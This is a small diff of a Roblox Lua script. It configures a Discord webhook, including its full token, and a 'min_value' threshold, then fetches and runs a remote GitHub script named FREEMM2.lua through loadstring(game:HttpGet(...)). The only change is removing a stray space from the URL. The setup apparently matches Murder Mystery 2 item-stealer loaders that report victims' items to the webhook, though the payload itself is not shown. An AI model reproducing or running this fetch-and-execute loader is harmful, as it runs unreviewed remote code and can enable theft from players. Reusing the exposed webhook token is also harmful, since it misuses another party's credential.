@@ -4,4 +4,4 @@ _G.min_value = 1
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
 _G.webhook = "https://discord.com/api/webhooks/1373395109982244965/bo5mtLdEHsgZbELMLRZezugN8qtDMrzRSALsLF5LpIu_f4zpSKrC3tbpWG0r3xjuufr7"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/MM2/refs/heads/main/FREEMM2.lua "))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/MM2/refs/heads/main/FREEMM2.lua"))()
